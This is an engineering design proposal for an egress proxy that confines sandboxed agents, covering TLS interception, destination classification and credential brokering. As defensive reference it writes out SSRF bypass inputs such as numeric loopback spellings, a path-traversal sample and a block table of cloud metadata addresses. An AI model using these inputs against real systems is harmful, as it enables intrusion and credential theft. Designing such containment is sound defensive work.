# FEP-6 (landed): the egress engine, an in-process Rust HTTP(S) proxy inside the Gateway

**Formwork Enhancement Proposal 6 — landed, macOS characterization owed.** Companion to
`formwork.md` (design + end-to-end spec), `constitution.md` (doctrine), `docs/fep-1.md` (what
host-scoped egress permits) and `docs/fep-5.md` (how a confined connection reaches the Gateway, the
host-rule grammar, inspection and brokering). Motivated by the Omnigent comparison in
`docs/omnigent-integration-eval.md`.

FEP-5 specifies what the Gateway enforces for egress and how the confined process's connections
reach it. It does not specify the program that serves those connections: which protocols it parses,
how it resolves and pins destinations, how it mints certificates, how it presents and guards
credentials, what it refuses to forward, and what it is built from. This FEP specifies that program,
the **egress engine**, and records the research behind the build decision.

**Status.** The engine is built in `crates/formwork-gateway/src/{egress,http,inspect,upstream,ca}.rs`
over the pure types of `crates/formwork-blueprint/src/egress.rs`; `docs/fep-6-plan.md` records how,
every departure from the text below, and what is still owed. The requirements (§6) and tests (§7)
are defined here, anchored, and code cites them bare. The §9 amendments are applied to `formwork.md`,
`constitution.md`, `docs/fep-1.md`, `docs/fep-5.md`, the shipped examples and the README, with
the FEP-5 verbs `https:` and `any:` replaced outright, not aliased: no release has shipped them.
What remains is the macOS characterization of `FW-CRED16`'s debugger denial, the client matrix
(`FW-E2E-094`) and the latency budget (`FW-E2E-096`); until they run, the report keeps
`credential-broker` `Partial` on macOS. Identifiers continue FEP-5's sequences: FEP-5 anchored up to
`FW-EGR15`, `FW-CRED15`, `FW-FID11`, `FW-BP15`, `FW-INV14`, `FW-E2E-091` and `FW-ADV-020`, and
FEP-4 drafted `FW-INV12` and `FW-DISC7`–`FW-DISC10`; this FEP mints `FW-EGR16`–26, `FW-CRED16`–19,
`FW-BP16`, `FW-FID12`–13, `FW-INV15`, `FW-E2E-092`–106 and `FW-ADV-021`–025. §7.2 walks through
ten concrete configurations, from a model-API-only agent to a corporate proxy, each with a test
form the harness runs as written.

**Reconciled with landed FEP-5.** FEP-5 landed while this FEP was drafted (Phases 0–4;
`docs/fep-5-plan.md` records how). The engine it landed (`egress.rs`, `inspect.rs`, `ca.rs`, on
`rustls` with `ring`, `rcgen` 0.13 and `rustls-native-certs`, with HTTP/1.1 framing written by hand
and no `hyper`) is the base this FEP's requirements were built on, requirement by requirement; the
plan records each change. §3's comparison of options holds; §5's dependency table describes the
composition this FEP recommended, and the plan the one built, which adds no crate and needs no MSRV
change. Landed FEP-5 restricted loopback destinations by name; `FW-EGR19` replaces that rule.

**The question that opened this FEP.** Omnigent does not use Envoy, Squid or mitmproxy. Its egress
proxy is about 2,900 lines of its own Python (asyncio, the standard-library `ssl` module, and
`cryptography` for certificates) under `omnigent/inner/egress/`. The proxy is present in the
repository's first public commit (2026-06-13), and no commit message in its 4,165-commit history
names another proxy. Formwork can build the equivalent in Rust on `hyper`, `rustls` and `rcgen`,
adding 34 crates to the release binary (§3); FEP-5's landing built one on the same TLS stack without
`hyper`. OpenAI's Codex (`codex-rs/network-proxy`) and Coder's
httpjail are shipped Rust egress proxies on the same building blocks (§2.2). Every protocol parser
and state machine in the proposed engine is Rust; the cryptographic primitives come from `ring`,
which is Rust with C and assembly cores (§3.3).

---

## 1. Problem

FEP-5 Phases 2 and 3 needed an engine behind the egress listener (for what landed, see the
reconciliation note above). Four inputs fix its shape.

- **The policy surface is mostly settled.** FEP-5 §4 fixes the host-rule grammar (`FW-BP13`), one
  grade per host (`FW-BP14`), brokering (`FW-BP12`, `FW-CRED11`) and the report keys. This FEP adds
  no blueprint field and no CLI flag. It does change two of FEP-5's verbs and the default grade:
  `allow:` and `tunnel:` replace `any:` and `https:`, and inspection becomes the default (§9 j).
- **The transport is settled.** On Linux the supervisor (`FW-EGR7`) turns each admitted `connect()`
  into a TCP connection to the Gateway listener whose source port it registered (`FW-EGR9`). On macOS
  the listener is a loopback port that checks a session credential and the peer PID. The engine
  starts at an accepted, authenticated connection.
- **FEP-5 leaves engine questions open.** HTTP/2 on inspected hosts (FEP-5 §9); the dependency set
  (FEP-5 §4 names `rustls`, `rcgen` and `hyper` without versions, features or a count); the
  upstream trust store; destination classification beyond FEP-1's list; the performance budget; and
  whether the engine is built or embedded.
- **Omnigent is the working reference for this feature,** and its proxy has defects the engine must
  not repeat (§2.1).

### 1.1 Constraints this FEP holds to

- **One concept.** The engine is part of the Gateway, "the single privileged broker; the one door
  for MCP and egress" (constitution Concepts). No sidecar process, daemon or second broker.
- **Self-contained release binary** (constitution Growth). Every documented feature works from the
  shipped `formwork` binary alone. An engine that needs a separately installed program fails this
  rule.
- **Layers.** `tokio` and every new crate stay in `formwork-gateway`. The types that foreign input
  parses into (host names, canonical paths) and the compiled host table are pure and live in
  `formwork-blueprint` and `formwork-compile`, so rules and requests parse into the same types.
- **Dependencies get the hardest no.** Each added crate is named with its features and its reason
  (§5).
- **Fail closed.** Input the engine cannot parse, classify or verify is refused, never forwarded
  ([FW-INV6](../formwork.md#fw-inv6); `FW-INV15`).
- **Channel split.** A refusal tells the confined process nothing beyond "denied"; the operator
  channel names the rule and the reason ([FW-CRED7](../formwork.md#fw-cred7), FEP-5 `FW-FID9`).
- **Transparency.** The engine serves the clients agents run (curl, git, Python, Node, Go, package
  managers) without per-client configuration beyond the variables the Launcher sets
  ([FW-TRA2](../formwork.md#fw-tra2)); §4.11 lists them and `FW-E2E-094` measures them.

---

## 2. Prior art

### 2.1 Omnigent's egress proxy

Read at `omnigent-ai/omnigent@56c6a7f` (2026-09-26). Paths are relative to `omnigent/inner/`.
Claims are from code reading; none of the Omnigent behavior below was run for this FEP.

| Component | Omnigent |
|---|---|
| Proxy core | `egress/proxy.py` (1,750 lines): an asyncio `StreamReader` loop that parses HTTP/1.1 heads by hand and header blocks with the standard-library `email` parser |
| TLS | standard-library `ssl` on both sides; `loop.start_tls` terminates the client side |
| Certificates | `cryptography`. An RSA-2048 CA stored at `~/.cache/omnigent-egress/ca-key.pem` (mode 0600) and valid 365 days (`egress/ca.py`); an RSA-2048 leaf per host, valid 24 h, in an LRU of 256 (`egress/certs.py`) |
| Rules | `"METHODS host/path"` with `*` and `**` globs compiled to regular expressions (`egress/rules.py`) |
| Linux transport | `bwrap --unshare-net`; an in-namespace relay on `127.0.0.1:<random>` bridges to a bind-mounted unix socket served by the parent (`egress/relay.py`) |
| macOS transport | SBPL allows `localhost:<relay>` only; an optional `Proxy-Authorization` token delivered over an inherited fd (`egress/controller.py`, `seatbelt_sandbox.py`) |
| Destinations | resolve in the parent, refuse when any address is not `is_global` or is Azure WireServer, connect to the first address (`proxy.py`, `_assert_destination_allowed`) |
| Credentials | add `Authorization` when absent (swap-on-access), or swap an `oa_cred_*` placeholder; never on TRACE or OPTIONS (`credential_proxy.py`, `proxy.py`) |
| HTTP/2 | ALPN offers `h2` only for a host whose rule admits every method and path and that has no credential; frames are relayed uninspected after termination |

**Adopted.** Each of these is correct and the engine keeps it.

1. Resolve once, validate every returned address, connect only to a validated address. A second
   lookup at connect time is the DNS-rebinding window.
2. Restrict host bytes to the DNS grammar before any rule match or lookup. Omnigent cites the
   sandbox-runtime NUL-byte fix as the reason (`egress/rules.py`, `_DNS_SAFE_HOST_RE`).
3. Never attach a credential to TRACE, which reflects the request back to the client, or to OPTIONS.
4. Serialize the forwarded request line from the parsed method and path, so the upstream receives
   exactly what the policy authorized.
5. Load the upstream trust anchors once, from a path the sandbox cannot write.
6. Treat a listener that cannot bind as a fatal error.

**Not adopted.** Each row is a behavior visible in the code, its consequence, and the engine's
alternative.

| Omnigent behavior | Consequence | Engine |
|---|---|---|
| Every CONNECT is TLS-terminated, with no per-host exception | Clients that ignore env-var trust (`gh` on macOS) fail on every host, which is why Omnigent rejects its `gh_basic` preset on macOS | Inspected by default as well, with `tunnel:` as a per-host exception for clients that cannot trust the session CA (§4.3, §9 j) |
| CA key stored on disk for 365 days | Any same-uid process outside the sandbox that reads the key file can mint certificates that every later session's clients trust for a year | In-memory CA per session, with name constraints (§4.6) |
| Request bodies are framed by `Content-Length` only; no code path reads `Transfer-Encoding: chunked` | A chunked upload is not forwarded and stalls until a timeout. `git push` sends chunked bodies for packs above `http.postBuffer` (1 MiB by default) | `hyper` framing; a head with both headers is refused (`FW-EGR11`) |
| The whole request body is read into memory (`readexactly(content_length)`) with no cap | Memory use is bounded only by the client | Bodies stream (§4.9, `FW-EGR21`) |
| `Connection: close` is forced on every upstream request | One TCP connect and one TLS handshake to the upstream per request | A per-session pool of keep-alive upstream connections (§4.4) |
| The 403 body names the method, host and path (`"GET https://h/p denied by policy"`) | The agent learns which rule refused it | Fixed body; the detail goes to the operator channel |
| Path globs match the raw request path | `/repos/acme/../other/x` matches `/repos/acme/**` (verified in the evaluation) | Canonicalize before matching (`FW-EGR11`) |
| Upstream reads time out after 60 s of silence | A model response that pauses longer than 60 s is cut | No per-read timeout on an open response body; idle limits apply between requests (§4.9) |

### 2.2 Other implementations

Read from source where the source is open, at these snapshots: `openai/codex@18344a9`,
`coder/httpjail@6d476da` (v0.6.2), `anthropic-experimental/sandbox-runtime@ddbeb74` (v0.0.77),
`github/gh-aw-firewall` (HEAD on 2026-09-27), `superfly/tokenizer@12c9cb2` and
`stripe/smokescreen@c8bfe28`. Docker Sandboxes, Vercel Sandbox, Deno Sandbox, E2B and Cloudflare
Sandbox are described from their documentation.

| System | Stack | TLS termination | Destination guard | Credentials |
|---|---|---|---|---|
| Codex `network-proxy` | Rust: `rama` `=0.3.0-alpha.4`, `rustls`, `rcgen` through `rama` (`codex-rs/network-proxy/Cargo.toml`) | only for hosts with request hooks, hosts bound to a brokered credential, or its GET/HEAD/OPTIONS "limited" mode; HTTP/2 on both sides | a name check before connecting and a check of the address the connector dials (`src/connect_policy.rs`, `TargetCheckedStreamConnector`) | a dummy with the credential's prefix and length in the environment, swapped in `Authorization` or a configured header for bound hosts; the path is checked for encoded separators before a URL-prefix binding applies (`src/authorization_path.rs`) |
| httpjail | Rust: `hyper` 1, `rustls`, `rcgen`, `tls-parser`, V8 for rules | every connection; HTTP/1.1 only; CA key on disk (`src/tls.rs`) | none | none |
| sandbox-runtime | TypeScript: `node:http` and a SOCKS5 server on one socket | opt-in `tlsTerminate`, HTTP/1.1 ALPN; `excludeDomains` tunnel | resolve once and dial the vetted address; loopback, link-local, metadata and the host's own interface addresses refused; NAT64 and 6to4 decoded; RFC 1918 allowed by default | a length-padded sentinel with per-credential hosts, substituted in headers and streamed bodies; AWS SigV4 re-signed |
| `gh-aw-firewall` | Squid and iptables in Docker | peeks the ClientHello and splices only when the server name is allowed (`src/squid/`); optional bump with a one-day CA | Squid ACLs | model-API keys held by a separate reverse-proxy container |
| Fly `tokenizer` | Go | none: the client sends plain HTTP to the proxy, which dials TLS; CONNECT is refused because a tunnel escapes the host check | private addresses refused at dial | a NaCl-sealed secret per request naming its allowed hosts |
| smokescreen | Go | optional per-ACL, static headers only | resolve, classify, dial the classified address | static headers |
| Docker Sandboxes | closed | yes, on the forward-proxy path | policy-aware resolver | sentinel in the sandbox; the proxy overwrites the header for bound hosts |
| Vercel Sandbox | closed | only for domains with header-transform rules; elsewhere the server name is matched and domain fronting is documented as possible | not documented | header transforms |
| Cloudflare Sandbox | closed | yes: TPROXY sends ports 80 and 443 to the Workers runtime; per-instance CA | not documented | Worker code sets headers |

What this changes in the design:

1. **Selective termination is the common design.** Codex, Vercel, sandbox-runtime's
   `excludeDomains` and `gh-aw-firewall` terminate TLS only where a request-level rule or a
   credential needs it. Formwork keeps both grades but makes inspection the default and `tunnel:` the
   per-host exception (§9 j), so the plainest rule gets the strongest check. `gh-aw-firewall`
   compares the ClientHello's server name with the allowlist before splicing, the check `FW-EGR16`
   requires.
2. **The CA key stays in memory.** Codex generates an ECDSA P-256 CA per process and keeps a test
   that the key is never written (`src/certs.rs`, `managed_ca_private_key_is_not_persisted`).
   httpjail and Omnigent store theirs on disk.
3. **No credential over plaintext.** Codex requires an explicit opt-in to broker over plain HTTP,
   and sandbox-runtime brokers only when it terminates TLS. The engine never presents a credential on
   a request it forwards without TLS (`FW-CRED19`).
4. **The host's own addresses are a destination class.** sandbox-runtime refuses its host's
   interface addresses. On a cloud machine with a public address, a wildcard rule whose name
   resolves to that address reaches every service listening on all interfaces, and the address is
   global, so a range table alone misses it (§4.5).
5. **Numeric host spellings.** sandbox-runtime canonicalizes hosts through the WHATWG URL parser,
   which reads `2130706433`, `0x7f.1` and `127.1` as IPv4 addresses, as `getaddrinfo` does. The
   engine applies the same reading and accepts only dotted-decimal (§4.2).
6. **Leaf certificate details break clients.** sandbox-runtime adds an authority key identifier
   because Python 3.13's `VERIFY_X509_STRICT` rejects leaves without one; httpjail sets the fixed
   serial `[1, 2, 3, 4]` on every leaf (`src/tls.rs`). §4.6 specifies both fields.
7. **HTTP/2.** Codex terminates HTTP/2 on both sides; sandbox-runtime and httpjail offer HTTP/1.1
   only. §4.8 and §10 record the choice for Formwork.
8. **Linux transport.** Codex runs the agent in a network namespace with no route, passes the
   in-namespace listening socket out over `SCM_RIGHTS`, and accepts on it from a bridge in the host
   namespace (`codex-rs/linux-sandbox/src/proxy_routing.rs`). It needs user namespaces, which
   FEP-5's supervisor does not; it is prior art for FEP-5's optional namespace path.

### 2.3 The Rust building blocks

Versions are from crates.io on 2026-09-27. Crate counts are packages added to Formwork's resolved
graph (66 packages today) when the option is added to `formwork-gateway`, measured with
`cargo tree -e normal,build` on Linux x86_64.

| Option | Latest | TLS | Leaf minting | Tunnel path | Added crates | Notes |
|---|---|---|---|---|---|---|
| `hudsucker` | 0.25.0, 2026-07-15 | `rustls` (compiles both `aws-lc-rs` and `ring`) | `rcgen`; every leaf served with the CA's own key pair (`src/certificate_authority/rcgen_authority.rs`) | peeks the ClientHello, then dials `TcpStream::connect(authority)` itself (`src/proxy/internal.rs`) | 104 lean, 120 default | one maintainer; WebSocket support always compiled |
| `http-mitm-proxy` | 0.18.0, 2026-01-24 | `rustls` server side; upstream `native-tls` by default | `rcgen`, P-256 key per host | intercepts every CONNECT or none | 67 with `rustls` | one maintainer, 5 commits in six months |
| `rama` | 0.4.0, 2026-08-19 | BoringSSL first, `rustls` secondary | `rcgen` or BoringSSL | `SniRouter`, `PeekTlsClientHelloService` | 158 slim, 226 with HTTP and `rustls` | MSRV 1.96; carries its own fork of `hyper` and `h2`; its `rustls` MITM example calls itself "not the recommended proxy architecture"; Codex pins `=0.3.0-alpha.4` |
| `pingora` | 0.9.0, 2026-09-09 | OpenSSL, BoringSSL, s2n; `rustls` called experimental | none built in | none: a reverse-proxy design where CONNECT gets 405 by default | 163 with `rustls` (`libz-ng-sys` builds with CMake) | `run_forever` may fork the process; five RUSTSEC entries |
| `third-wheel` | 0.6.0, 2021-03-18 | OpenSSL, `hyper` 0.14 | OpenSSL | — | — | unmaintained |
| Compose (§3.3) | — | `rustls` on `ring` | `rcgen` with an in-memory `Issuer` | the engine's own code, so pinning applies | 34; 39 with HTTP/2 | the set Codex's and httpjail's proxies are built from, less the frameworks |

Measured alternatives within the composed set: `aws-lc-rs` instead of `ring` adds 10 crates;
`rustls-platform-verifier` instead of `rustls-native-certs` adds 6 on Linux and 15 across targets;
`hickory-resolver` adds 66; `tls-parser` for ClientHello parsing adds 22 on its own.

Security history bearing on the choice (RUSTSEC):

- **`h2`**, the HTTP/2 implementation under `hyper`: four denial-of-service advisories since 2023,
  each a flood the server side absorbs: resets (RUSTSEC-2023-0034), error resets
  (RUSTSEC-2024-0003), CONTINUATION frames (RUSTSEC-2024-0332) and empty DATA frames
  (RUSTSEC-2026-0258, August 2026).
- **`hyper`** HTTP/1 parsing: four request-smuggling advisories in 2020–2021 (RUSTSEC-2020-0008,
  RUSTSEC-2021-0020, RUSTSEC-2021-0078, RUSTSEC-2021-0079), none since; none ever for `httparse`.
- **`rustls`**: RUSTSEC-2024-0399 was a panic in `Acceptor::accept`, the ClientHello-peek API §4.3
  uses (fixed in 0.23.18); RUSTSEC-2026-0285 is fixed only in 0.23.45, the current release.
- **`pingora`**: RUSTSEC-2026-0033 spliced a WebSocket upgrade before the upstream answered `101`.
  The engine splices an upgraded connection only after the upstream's `101` (§4.8).

For scale: Omnigent's proxy is about 2,900 lines of Python. Codex's `network-proxy` is 29,400 lines
of Rust in 61 files including 305 tests, and covers SOCKS5, request hooks, configuration and
credential providers that this FEP does not need. httpjail is 9,500 lines including its Linux
namespace and nftables setup.

---

## 3. Build or buy

### 3.1 A proxy program beside `formwork`

Envoy, Squid, mitmproxy and smokescreen would each run as a second program per session, with
`formwork` rendering its configuration, supervising its lifetime and translating its logs into
violation records.

- **Envoy** cannot mint certificates from a local CA. The workable path terminates CONNECT into an
  internal listener whose TLS context uses the `on_demand_secret` certificate selector with the SNI
  mapper, which pauses each handshake and asks an SDS server, one Formwork would have to write, for
  a certificate; session resumption is not supported in that mode
  (`api/envoy/extensions/transport_sockets/tls/cert_selectors/on_demand_secret/v3/config.proto`).
  Its `credential_injector` filter sets a static secret or an OAuth2 client-credentials token in
  `Authorization`; a placeholder swap needs a Lua, Wasm or dynamic-module filter.
- **Squid** mints certificates with `ssl-bump generate-host-certificates=on` and
  `security_file_certgen`, and its peek, splice and bump steps are mature (`gh-aw-firewall` ships a
  configuration). Credential injection needs ICAP or eCAP, and every value rendered into its
  configuration language has to be escaped.
- **mitmproxy** mints certificates, speaks HTTP/2 and WebSocket, and makes a placeholder swap a
  short addon. It is about 23 MB of wheels plus a CPython runtime.
- **smokescreen** resolves, classifies and dials the classified address, and now has optional MITM
  with static headers. It has no method or path rules; the stripped binary is 13.8 MB.

Each fails the self-contained-binary rule (constitution Growth) and places the policy decision, the
credential and the refusal record in a second program outside the Gateway concept. None is
proposed.

### 3.2 A Rust proxy framework

Every framework in §2.3 opens the upstream socket for a tunnelled host itself, from the authority
string, so the engine's resolve-classify-dial sequence (§4.5) cannot run on the tunnel path without
a fork. `hudsucker` also serves every leaf with the CA's key, and chooses only between intercepting
and tunnelling at the ClientHello, with no refusal. `http-mitm-proxy` intercepts every CONNECT or
none. `rama` would raise the MSRV to 1.96, bring its own `hyper` and `h2` fork and 158–226 crates,
and depend largely on one maintainer. `pingora` is a reverse proxy. The frameworks add 67 to 228
crates against 34 for the composed set, and the parts they save (the CONNECT upgrade, the ClientHello
peek, the leaf cache) are each a few hundred lines on `hyper` and `rustls`.

### 3.3 Composing the engine

The engine is built on `hyper` (HTTP/1 server and client, including the CONNECT upgrade),
`tokio-rustls` and `rustls`, `rcgen` for the CA and leaves, `rustls-native-certs` for the host trust
store, and `tokio::net::lookup_host` for resolution. The manifest is in §5. `httparse` arrives with
`hyper`; nothing else parses HTTP.

**What "pure Rust" means here.** Every parser and state machine the confined process's bytes reach
(HTTP/1.1 in `hyper` and `httparse`, TLS in `rustls`, certificate handling in `rustls-webpki` and
`rcgen`) is Rust. The cryptographic primitives come from `ring`, which is Rust with C and assembly
cores derived from BoringSSL and needs a C compiler through `cc` at build time. `aws-lc-rs`, the
`rustls` default, is C as well, and adds 10 crates. A provider written wholly in Rust exists
(`rustls-rustcrypto`) and is not proposed for a component that terminates TLS for credentials.

### 3.4 Decision

Build the engine in `formwork-gateway` on the composed set. It is the only option in which
destination pinning, the server-name check, the placeholder scan and the reflection guard all run
on every path, and it adds the fewest crates. Codex's `network-proxy` and httpjail show the same
building blocks in shipped Rust egress proxies.

---

## 4. Design

### 4.1 Placement

```
formwork run  (one process, outside the sandbox)
 ├─ Launcher        environment (proxy and CA variables, placeholders), spawn
 ├─ Supervisor      Linux only (FEP-5 FW-EGR7): seccomp user notification → register → ADDFD
 └─ Gateway         tokio runtime, formwork-gateway
     ├─ MCP shading (landed)
     └─ egress engine (this FEP)
          listener → front door → host decision ─┬─ tunnel grade    → upstream connector
                                                 └─ inspected grade → upstream pool
```

- **Pure parts.** `formwork-blueprint` gains the parsed types `HostName`, `HostPattern` and
  `CanonicalPath`. Blueprint rules parse into them at the blueprint edge and requests parse into
  them at the Gateway edge, so one function defines canonical form for both (constitution
  Boundaries). `formwork-compile` compiles host rules into an `EgressPolicy` inside `GatewayPolicy`:
  an exact-name map, a wildcard-suffix list, per-host grade, method sets, compiled path globs and
  broker bindings without secrets. The match function is pure and is tested without `tokio`.
  `EgressPolicy` serializes with `BTreeMap` ordering, so compilation stays byte-deterministic
  ([FW-FID4](../formwork.md#fw-fid4)).
- **Secrets are runtime state.** Brokered credentials never enter `CompiledPolicy`, the report or
  any record (constitution Boundaries). The Launcher reads each source and hands the engine a vault
  keyed by Catalog type.
- **Engine.** A module `egress` in `formwork-gateway` with its own typed error, `EgressError`.
  The engine serves exactly one session, so the upstream pool, leaf cache and vault need no
  cross-session isolation.

### 4.2 Connection pipeline

Each stage either passes a typed value to the next or ends the connection with a refusal and a
violation record (§4.10).

1. **Accept.** On Linux the source port must be registered by the supervisor; on macOS the
   connection must present the session credential and pass the peer-PID check (FEP-5 `FW-EGR9`).
   A failing connection is closed without a response.
2. **Proxy request head.** Read within **head-timeout**, bounded by **head-limit** (§4.9). Two forms
   are accepted: `CONNECT host:port` and an absolute-form request (`GET http://host/path`) for a
   plain-HTTP rule. Any other form gets 400 and a close.
3. **Authority.** Parse into `HostName` or an IP literal plus a port ([FW-EGR3](fep-1.md#fw-egr3)):
   bytes limited to `[A-Za-z0-9.-]`, lowercased, one trailing dot removed, no empty label, labels of
   at most 63 bytes, names of at most 253; IPv6 literals in brackets without a zone identifier;
   non-ASCII names refused (clients send A-labels). A name whose last label is numeric or starts
   with `0x` is read as an IPv4 address, as the WHATWG URL parser and `getaddrinfo` read it, and
   accepted only in dotted-decimal form: `2130706433`, `0x7f.1` and `127.1` are refused as
   `malformed`. One `HostName` value then serves the policy decision, the leaf certificate, the
   credential binding and the upstream TLS server name.
4. **Host decision.** Look the host up in `EgressPolicy`: `deny` rules first (terminal), then exact
   names, then wildcard suffixes. The result is not listed, denied, tunnel, or inspected.
5. **Destination.** Resolve and classify (§4.5); the result is an ordered list of admitted
   addresses.
6. **Grade.** Tunnel (§4.3) or inspected (§4.4).

The front door is the only stage that knows how the connection arrived. A later front door, such as
an original-destination mode fed by the supervisor's registration record (FEP-5 §9 "Transparent
mode"), reuses stages 3 to 6 unchanged.

### 4.3 Tunnel grade

A host is tunnel grade only when its rule is `tunnel:host[:port]` (§9 j): the exception for clients
that cannot trust the session CA, and for protocols the engine does not inspect.

1. Reply `200 Connection Established`.
2. Read from the client until one complete TLS ClientHello is buffered, within **hello-timeout** and
   bounded by **hello-limit**. A first byte other than `0x16` (TLS handshake) is refused as
   `not-tls`.
3. Parse the buffered bytes with `rustls::server::Acceptor`, which exposes the ClientHello before any
   server configuration is chosen, and read the server name. The raw bytes stay in the engine's
   buffer; the acceptor is dropped. This reuses rustls's parser and adds no crate.
4. The server name must equal the CONNECT host after the same canonicalization. A missing name is
   accepted only under an IP-literal rule. A mismatch is refused as `sni-mismatch`.
5. Connect to the first reachable admitted address, write the buffered ClientHello, and copy bytes
   in both directions until either side closes.

The engine checks the name the client claims in cleartext. It cannot see the `Host` inside the
tunnel, so a CDN that serves many names from one address can be used for domain fronting; the
verdict stays `Partial` per [FW-EGR5](fep-1.md#fw-egr5). A client using Encrypted Client Hello sends
an outer name for the provider's client-facing server, which differs from the CONNECT host, and is
refused as `sni-mismatch`; the operator line names ECH as the likely cause.

### 4.4 Inspected grade

1. Reply `200 Connection Established`, then read the ClientHello through
   `tokio_rustls::LazyConfigAcceptor`. The server name must equal the CONNECT host, as in §4.3.
2. Obtain the host's leaf certificate from the session cache, minting it on first use (§4.6), and
   complete the handshake with ALPN `http/1.1` (§4.8).
3. Serve HTTP/1.1 on the connection with `hyper`'s server connection. For each request:
   1. the `Host` header must equal the CONNECT authority (FEP-5 `FW-EGR10`), else `host-mismatch`;
   2. TRACE and CONNECT are refused under every rule (`FW-EGR23`);
   3. the path is canonicalized (FEP-5 `FW-EGR11`) and matched with the method against the host's
      rules; the query string is not part of the match;
   4. request target and header values are scanned for placeholders (§4.7);
   5. a brokered credential is presented (§4.7);
   6. hop-by-hop headers and `Proxy-Authorization` are removed, and the request line is written
      from the method and canonical path that matched (`FW-EGR22`);
   7. the request goes upstream through the session pool, and the response streams back, through
      the reflection guard when a credential was presented (§4.7).
4. A refused request gets `403` with the body `denied by formwork policy` and the connection stays
   usable, as it would after any other `403`.

The upstream side is a pool of keep-alive `hyper::client::conn::http1` connections keyed by host
and port. Its connector resolves and classifies (§4.5), connects to admitted addresses in answer
order, and verifies the upstream certificate for the host name against the host trust store
(`FW-EGR24`). A pooled connection is reused only for the host it was opened for.

### 4.5 Destination policy

The engine resolves names with the host's own resolver (`getaddrinfo`, through
`tokio::net::lookup_host`), so `/etc/hosts`, NSS and split-horizon corporate DNS behave for the
session as they do for the operator. One resolution per upstream connection; every returned address
is classified; if any address is refused, the connection is refused (`address-class`), because a
mixed public and private answer is the rebinding pattern. The engine then connects only to addresses
from that answer (`FW-EGR17`).

Classes are checked in table order and the first match decides, so `169.254.169.254` is metadata
before it is link-local. Each address is checked, and for IPv6 forms that embed an IPv4 address, the
embedded address as well:

| Class | Ranges | Admitted by |
|---|---|---|
| Metadata | `169.254.169.254`, `fd00:ec2::254`, `100.100.100.200` (Alibaba), `168.63.129.16` (Azure WireServer) | an IP-literal rule naming the address ([FW-EGR4](fep-1.md#fw-egr4)) |
| Gateway endpoints | the session's own listener addresses and ports | never (`FW-EGR18`) |
| Host addresses | every address on the host's interfaces, enumerated with `getifaddrs` at session start | an IP-literal rule, or an exact-name rule (`FW-EGR19`) |
| Local and private | `0.0.0.0/8`, `127.0.0.0/8`, `::1`, `::`, RFC 1918, `100.64.0.0/10`, `169.254.0.0/16`, `fe80::/10`, `fc00::/7` | an IP-literal rule, or an exact-name rule (`FW-EGR19`); never a wildcard rule |
| Special-purpose | `192.0.0.0/24`, `192.0.2.0/24`, `198.18.0.0/15`, `198.51.100.0/24`, `203.0.113.0/24`, `240.0.0.0/4`, `255.255.255.255`, multicast, `100::/64`, `2001:db8::/32` | an IP-literal rule |
| Global | everything else | any matching rule |

Embedding forms: IPv4-mapped (`::ffff:0:0/96`), IPv4-compatible (`::/96`), NAT64
(`64:ff9b::/96`, `64:ff9b:1::/48`), 6to4 (`2002::/16`) and Teredo (`2001::/32`, the client address
is XOR-obfuscated). `64:ff9b::a9fe:a9fe` reaches `169.254.169.254` on a NAT64 network, so it is
classified as metadata. The table is written out in the engine: the standard library's
`Ipv4Addr::is_global` and `Ipv6Addr::is_global` are unstable.

Three changes from FEP-1 are proposed (§9 b, §10). FEP-1 does not list loopback, so a wildcard
rule whose name an attacker controls could reach services on the operator's loopback interface;
loopback joins the local class. The host's own interface addresses become a class, because on a
machine with a public address they are global and a range table alone admits them. FEP-1 also lets
only IP literals name private ranges, which makes every
intranet host unreachable by name and conflicts with its own `FW-E2E-029`, where `allowed.test`
resolves to `127.0.0.1`. The table admits local and private addresses for exact-name rules and never
for wildcards: the rebinding attacks in the record depend on a name the attacker controls, which a
wildcard grants and an exact name does not.

### 4.6 Session CA and leaf certificates

The CA exists only when the blueprint has an inspected rule. It is generated in memory at Gateway
start with `rcgen` and its private key is never serialized (FEP-5 `FW-EGR13`).

| Field | CA | Leaf |
|---|---|---|
| Key | ECDSA P-256, generated per session | ECDSA P-256, one key per session, distinct from the CA key, shared by all leaves |
| Basic constraints | CA, path length 0 | not a CA |
| Key usage | `keyCertSign`, `cRLSign` | `digitalSignature`; EKU `serverAuth` |
| Subject alternative name | none | the host as a DNS name, or an IP address for an IP-literal rule |
| Name constraints | permitted subtrees: each inspected exact name, each wildcard's suffix, each inspected IP literal (`FW-EGR25`) | none |
| Key identifiers | subject key identifier | subject and authority key identifiers (Python 3.13's `VERIFY_X509_STRICT` requires the authority identifier) |
| Serial | 16 random bytes, high bit clear, so the integer is positive | same, fresh per leaf |
| Validity | from one hour before start to **ca-lifetime** after | from one hour before minting to **leaf-lifetime** after; re-minted when half has elapsed |

The name constraints restrict what a leaked key or a minting defect could impersonate to the hosts
the blueprint already inspects, in every client that enforces constraints on a trust anchor. Which
clients do is **(characterize)**: OpenSSL, BoringSSL, Go and rustls-webpki are expected to, and the
client matrix (`FW-E2E-094`) records the result per client.

The trust bundle handed to the session is the host trust store the engine loaded for upstream
verification (§4.4), plus the session CA, as PEM. It is written read-only into the session scratch
(FEP-5 `FW-TRA9`), and the Launcher points the CA variables at it.

### 4.7 Brokering in the engine

FEP-5 §3.2 defines brokering: placeholders, swap-on-access, per-host schemes. The engine adds four
mechanisms.

**Custody.** While the vault holds any credential, the Gateway process is not dumpable: on Linux
`prctl(PR_SET_DUMPABLE, 0)`, which makes reading its memory through `/proc/<pid>/mem` or `ptrace`
require `CAP_SYS_PTRACE` whatever Yama and Landlock decide; on macOS `ptrace(PT_DENY_ATTACH)`
**(characterize)** (`FW-CRED16`). The flag is set before the workload is spawned, because the
process's own environment, readable through `/proc/<pid>/environ` by a same-uid process, holds an
env-sourced credential from the moment `formwork run` starts; a non-dumpable process's `/proc`
entries belong to root. The confined child is unaffected, since `execve` resets the flag for the new
image.

**Presentation limits.** The engine never presents a credential on OPTIONS (`FW-CRED18`), and TRACE
is refused outright on inspected hosts (`FW-EGR23`). It never presents a credential on a request it
forwards without TLS, since the bytes would cross the network in the clear (`FW-CRED19`); §9 (i)
makes the matching blueprint a compile error. A request that already carries a non-placeholder
credential header is forwarded unchanged.

**Placeholder scan.** For every inspected request the engine scans the request target and every
header value for the session placeholder prefix (`fwcred-`). A placeholder bound to another host, an
unknown placeholder, or a placeholder outside its scheme's header is refused as `placeholder`.
Bodies are not scanned (FEP-5 §9). On a tunnel host the request is opaque and the engine cannot see
a placeholder; a placeholder has no authority outside the Gateway, so its disclosure is not a
credential disclosure, and §9 (a) narrows FEP-5 `FW-CRED11` to match.

